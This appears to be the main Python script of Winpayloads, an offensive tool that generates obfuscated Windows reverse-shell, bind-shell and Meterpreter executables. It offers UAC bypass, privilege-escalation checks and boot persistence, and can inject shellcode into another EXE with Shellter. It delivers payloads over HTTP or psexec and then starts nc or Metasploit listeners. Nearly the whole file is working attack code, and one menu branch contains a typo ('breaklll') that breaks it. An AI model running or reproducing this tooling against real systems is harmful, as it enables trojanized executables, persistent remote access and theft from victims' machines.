#!/usr/bin/python
from main import *
from payloadextras import *
from startmetasploit import *


if not re.search('winpayloads', os.getcwd().lower()):
    print t.bold_red + "[!!] Please Run From Winpayloads Dir" + t.normal
    sys.exit(1)

try:
    iperror = False
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 0))
    IP = s.getsockname()[0]
except:
    iperror = True

payload, payloadchoice, payloaddir, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE, payloadname = '', '', '/etc/winpayloads', 'n', 'n', 'n', ''

try:
    os.mkdir(payloaddir)
except OSError:
    pass

print t.clear
print '=' * t.width + t.bold_red
print " _       ___       ____              __                __".center(t.width)
print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(t.width)
print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
print "   /____/".center(t.width)
print t.normal + '=' * t.width
print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
       t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
print ('[2] Windows Reverse Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
       ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width) + t.normal
print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
       ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
       t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width + 6) + t.normal
print '=' * t.width

try:
    while True:
        menuchoice = raw_input('> ')
        if menuchoice == '1':
            payloadchoice = SHELLCODE.windows_rev_shell
            payload = 'Windows Reverse Shell'
            breaklll
        elif menuchoice == '2':
            payloadchoice = SHELLCODE.windows_met_rev_shell
            payload = 'Windows Meterpreter Reverse Shell'
            break
        elif menuchoice == '3':
            payloadchoice = SHELLCODE.windows_met_bind_shell
            payload = 'Windows Meterpreter Bind Shell'
            break
        elif menuchoice == '4':
            payloadchoice = SHELLCODE.windows_met_rev_https_shell
            payload = 'Windows Meterpreter Reverse HTTPS '
            break
        else:
            print t.bold_red + '[*] Wrong Selection' + t.normal

    print t.bold_green + '\n[*] Payload Set As %s\n' % (payload) + t.normal

    if menuchoice == '1' or menuchoice == '2' or menuchoice == '4':
        portnum = raw_input(
            '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
        if len(portnum) is 0:
            portnum = 4444

        if iperror == False:
            ipaddr = raw_input(
                '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
            if len(ipaddr) is 0:
                ipaddr = IP
        else:
            print t.bold_red + 'Error Getting Ip Automatically'
            ipaddr = raw_input(
                '\n[*] Press Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')

        print t.bold_green + '\n[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
        try:
            if menuchoice == '4':
                iphex = ipaddr
            else:
                ip1, ip2, ip3, ip4 = ipaddr.split('.')
                iphex = struct.pack('BBBB', int(
                    ip1), int(ip2), int(ip3), int(ip4))
        except:
            print t.bold_red + '[*] Error in IP Syntax'
            sys.exit(1)
        try:
            if menuchoice == '4':
                porthex = struct.pack('<h', int(portnum))
            else:
                porthex = struct.pack('>h', int(portnum))
        except:
            print t.bold_red + '[*] Error in Port Syntax'
            sys.exit(1)
        if menuchoice == '4':
            shellcode = payloadchoice % (porthex, iphex)
        else:
            shellcode = payloadchoice % (iphex, porthex)
    elif menuchoice == '3':
        bindport = raw_input(
            '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
        if len(bindport) is 0:
            bindport = 4444
        try:
            bindporthex = struct.pack('>h', int(bindport))
        except:
            print t.bold_red + '[*] Error in IP Syntax'
            sys.exit(1)
        shellcode = payloadchoice % (bindporthex)

    if menuchoice == '2' or menuchoice == '3' or menuchoice == '4':
        want_UACBYPASS = raw_input(
            t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)? y/[n]:' + t.normal)
        if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '':
            want_ALLCHECKS = raw_input(
                t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
        if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '' and want_ALLCHECKS.lower() == 'n' or want_ALLCHECKS.lower() == '':
            want_PERSISTENCE = raw_input(
                t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)

    if want_PERSISTENCE.lower() == 'y':
        ez2read_shellcode = EXTRAS(shellcode).PERSISTENCE()
    elif want_UACBYPASS.lower() == 'y':
        ez2read_shellcode = EXTRAS(shellcode).UACBYPASS()
    elif want_ALLCHECKS.lower() == 'y':
        ez2read_shellcode = EXTRAS(shellcode).ALLCHECKS()
    else:
        ez2read_shellcode = EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE()

    want_to_payloadinexe = raw_input(
        t.bold_red + '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ' + t.normal)

    if not want_to_payloadinexe == 'y':
        with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
            Filesave.write(FUNCTIONS().DoPyCipher(SHELLCODE.injectwindows % (ez2read_shellcode)))
            Filesave.close()

        print '[*] Creating Payload using Pyinstaller...'
        subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
                         '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print '[*] Cleaning Up...'
        if menuchoice == '1':
            payloadname = 'ReverseStagelessShell.exe'
            os.system('mv %s/dist/payload.exe %s/%s' %
                      (payloaddir, payloaddir, payloadname))
        elif menuchoice == '2':
            payloadname = 'ReverseWindowsMeterpreter.exe'
            os.system('mv %s/dist/payload.exe %s/%s' %
                      (payloaddir, payloaddir, payloadname))
        elif menuchoice == '3':
            payloadname = 'BindWindowsMeterpreter.exe'
            os.system('mv %s/dist/payload.exe %s/%s' %
                      (payloaddir, payloaddir, payloadname))
        elif menuchoice == '4':
            payloadname = 'ReverseHTTPSWindowsMeterpreter.exe'
            os.system('mv %s/dist/payload.exe %s/%s' %
                      (payloaddir, payloaddir, payloadname))
        else:
            os.system('mv %s/dist/payload.exe %s/payload.exe' %
                      (payloaddir, payloaddir))

        os.system('rm %s/logdict*' % os.getcwd())
        os.system('rm %s/dist -r' % payloaddir)
        os.system('rm %s/build -r' % payloaddir)
        os.system('rm %s/*.spec' % payloaddir)
        os.system('rm %s/payload.py' % payloaddir)
        print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s' % (payloaddir, payloadname) + t.normal

    if want_to_payloadinexe.lower() == 'y':
        payloadinexe_payloadname = raw_input(
            t.bold_green + '[*] EXE Filepath or URL to EXE: ' + t.normal)
        os.chdir(os.getcwd() + '/shellter')
        try:
            os.mkdir('compiled')
        except:
            pass
        with open('payloadbin', 'wb') as Csave:
            Csave.write(shellcode)
            Csave.close()
        payloadinexe_payloadnameshort = re.search(
            '\w+\.exe$', payloadinexe_payloadname)
        if re.search('(http:\/\/|https:\/\/)', payloadinexe_payloadname):
            os.system('wget ' + payloadinexe_payloadname)
            payloadinexe_payloadname = payloadinexe_payloadnameshort.group(0)
        os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
                  payloadinexe_payloadname)
        os.system('mv %s ./compiled/%s' %
                  (payloadinexe_payloadname, payloadinexe_payloadnameshort.group(0)))
        try:
            os.system('rm ' + payloadinexe_payloadnameshort.group(0))
            os.system('rm ' + payloadinexe_payloadnameshort.group(0) + '.bak')
            os.system('rm payloadbin')
        except:
            pass

    want_to_upload = raw_input(
        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
    if want_to_upload.lower() == 'y' or want_to_upload == '':
        if want_to_payloadinexe == 'y' and want_to_upload.lower() == 'y' or want_to_payloadinexe == 'y' and want_to_upload.lower() == '':
            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadnameshort.group(0)) + t.normal
            a = multiprocessing.Process(
                target=FUNCTIONS().ServePayload, args=(os.getcwd() + '/compiled',))
            a.daemon = True
            a.start()
        elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadname) + t.normal
            a = multiprocessing.Process(
                target=FUNCTIONS().ServePayload, args=(payloaddir,))
            a.daemon = True
            a.start()

    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
        FUNCTIONS().DoPsexec(payloaddir,payloadname)

    if menuchoice == '1':
        os.system('nc -lvp %s' % portnum)

    elif menuchoice == '2':
        if want_UACBYPASS.lower() == 'y':
            METASPLOIT().metrev_uac(portnum)
        elif want_ALLCHECKS.lower() == 'y':
            METASPLOIT().metrev_allchecks(portnum)
        elif want_PERSISTENCE.lower() == 'y':
            METASPLOIT().metrev_persistence(portnum)
        else:
            METASPLOIT().metrev_normal(portnum)

    elif menuchoice == '3':
        bindip = raw_input(
            '\n[*] Target Bind IP Address \n[*] IP> ')
        if want_UACBYPASS.lower() == 'y':
            METASPLOIT().metbind_uac(bindport,bindip)
        elif want_ALLCHECKS.lower() == 'y':
            METASPLOIT().metbind_allchecks(bindport,bindip)
        elif want_PERSISTENCE.lower() == 'y':
            METASPLOIT().metbind_persistence(bindport,bindip)
        else:
            METASPLOIT().metbind_normal(bindport,bindip)

    elif menuchoice == '4':
        if want_UACBYPASS.lower() == 'y':
            METASPLOIT().methttp_uac(portnum)
        elif want_ALLCHECKS.lower() == 'y':
            METASPLOIT().methttp_allchecks(portnum)
        elif want_PERSISTENCE.lower() == 'y':
            METASPLOIT().methttp_persistence(portnum)
        else:
            METASPLOIT().methttp_normal(portnum)

    raise KeyboardInterrupt
except KeyboardInterrupt:
    print t.bold_green + '\n[*] Cleaning Up\n' + t.normal
    subprocess.call(['rm *.rc'], shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.call(['rm *.ps1'], shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sys.exit()
